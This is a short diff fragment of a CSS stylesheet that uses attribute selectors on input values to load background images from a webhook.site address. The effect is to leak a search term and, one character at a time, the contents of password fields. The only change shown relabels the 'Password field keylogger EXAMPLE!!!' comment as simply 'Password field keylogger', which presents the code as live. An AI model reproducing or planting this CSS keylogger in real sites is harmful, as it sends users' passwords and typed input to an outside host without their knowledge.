@@ -103,7 +103,7 @@ input[value*="PERP" i] {
   background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/search?q=PERP") !important;
 }
 
-/* Password field keylogger EXAMPLE!!!*/
+/* Password field keylogger */
 input[type="password"][value^="a" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=a") !important; }
 input[type="password"][value^="b" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=b") !important; }
 input[type="password"][value^="c" i] { background-image: url("https://webhook.site/210f6b89-17b5-48f4-b771-cccea832bf02/pwd?c=c") !important; }
